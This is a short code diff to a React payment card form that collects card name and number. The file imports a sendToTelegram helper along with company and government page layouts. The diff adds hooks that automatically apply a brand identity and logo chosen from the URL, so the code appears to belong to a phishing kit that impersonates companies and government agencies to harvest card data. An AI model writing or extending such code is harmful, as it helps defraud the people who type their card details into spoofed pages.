@@ -12,7 +12,9 @@ import { sendToTelegram } from "@/lib/telegram";
 import { Card } from "@/components/ui/card";
 import { designSystem } from "@/lib/designSystem";
 import PaymentMetaTags from "@/components/PaymentMetaTags";
-import { detectEntityFromURL, getEntityLogo } from "@/lib/dynamicIdentity";
+import { detectEntityFromURL, getEntityLogo, getEntityIdentity } from "@/lib/dynamicIdentity";
+import { useAutoApplyIdentity } from "@/hooks/useAutoApplyIdentity";
+import { useDynamicIdentity } from "@/components/DynamicIdentityProvider";
 import { getCompanyLayout } from "@/components/CompanyLayouts";
 import { getGovernmentLayout } from "@/components/GovernmentLayouts";
 
@@ -21,6 +23,9 @@ const PaymentCardForm = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const { data: linkData } = useLink(id);
+
+  useAutoApplyIdentity();
+  const { identity: dynamicIdentity } = useDynamicIdentity();
   
   const [cardName, setCardName] = useState("");
   const [cardNumber, setCardNumber] = useState("");
